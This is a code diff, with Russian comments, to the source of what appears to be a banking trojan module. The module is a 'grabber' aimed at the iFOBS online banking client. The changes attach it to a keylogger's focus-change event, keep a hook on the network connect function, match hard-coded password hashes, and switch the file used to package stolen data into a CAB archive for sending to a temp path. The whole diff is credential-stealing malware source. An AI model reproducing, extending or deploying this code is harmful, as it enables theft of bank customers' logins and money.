@@ -49,6 +49,8 @@ const static DWORD IFOPasswordHashes[] = {0xF1E44A82 /* пароль */,
 namespace IfobsOnline
 {
 	DWORD PID = 0;        // Пид процесса, в котором работает грабер
+	DWORD EventID = 0;    // Ид события смены фокуса
+	HWND  FrameWnd = 0;
 	TIfobsOnlineGrabber *Grabber = NULL;
 
 	HWND  AppletWnd = 0;  // Идентификатор окна аплета
@@ -76,42 +78,22 @@ namespace IfobsOnline
 	}
 
 
-
-
-	//*****************************************************
-	//  Initialize - Функия инициализирует грабер
-	//*****************************************************
-	bool Initialize(HWND JafaFrameWnd, const char* URL)
+	void WINAPI FocusChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 	{
-		// проверяем текущий процесс
-		if (IsNewProcess(PID))
-		{
-			Real_Connect = NULL;
-			Grabber      = NULL;
-		}
-
-
-		// Закрываем старый грабер
-		if (Grabber)
-		{
-			delete Grabber;
-			Grabber = NULL;
-        }
-
 		// Создаём новый грабер
-		Grabber = new TIfobsOnlineGrabber(JafaFrameWnd);
+        if (Grabber) return;
+
+		Grabber = new TIfobsOnlineGrabber(FrameWnd);
 
 		if (!Grabber->IsIfobs())
 		{
 			// Окно не является окном ИФобс
-			PCHAR T = GetAllWindowsText(JafaFrameWnd, true, true);
-			IFODBG("IfobsOnline", "Окно не является ифобсом \r\n%s\r\n---------------", T);
 			delete Grabber;
 			Grabber = NULL;
-			return false;
-        }
+			return;
+		}
 
-        IFODBG("IfobsOnline", "Стартуем IfobOnline [URL: %s]", URL);
+		IFODBG("IfobsOnline", "Стартуем IfobOnline ");
 
 
 		// Проверяем на предмет уже установленных хуков
@@ -122,7 +104,42 @@ namespace IfobsOnline
 			{
 				__asm mov [Real_Connect], eax
 			}
+		}
+    }
+
+
+
+	//*****************************************************
+	//  Initialize - Функия инициализирует грабер
+	//*****************************************************
+	bool Initialize(HWND JafaFrameWnd, const char* URL, bool IsChildWnd)
+	{
+		// проверяем текущий процесс
+		if (!IsChildWnd) return false;
+
+		if (IsNewProcess(PID))
+		{
+			Real_Connect = NULL;
+			Grabber      = NULL;
+			EventID      = 0;
+			FrameWnd     = NULL;
+		}
+
+
+		// Закрываем старый грабер
+		if (Grabber)
+		{
+			delete Grabber;
+			Grabber = NULL;
         }
+
+		if (EventID == 0)
+		{
+			// Подключаем событие на смену фокуса
+            EventID = KeyLogger::ConnectEventHandler(KLE_FOCUS_CHANGED, FocusChanged);
+		}
+
+		FrameWnd = JafaFrameWnd;
 
 		return true;
 	}
@@ -285,7 +302,7 @@ BOOL TIfobsOnlineGrabber::SendLog()
 
 	BOOL Result = FALSE;
 
-	string CABName = "c:\\ifobs.cab";//File::GetTempName2A();
+	string CABName = File::GetTempName2A();
 	HCAB Cab = CreateCab(CABName.t_str());
 	if (Cab)
 	{
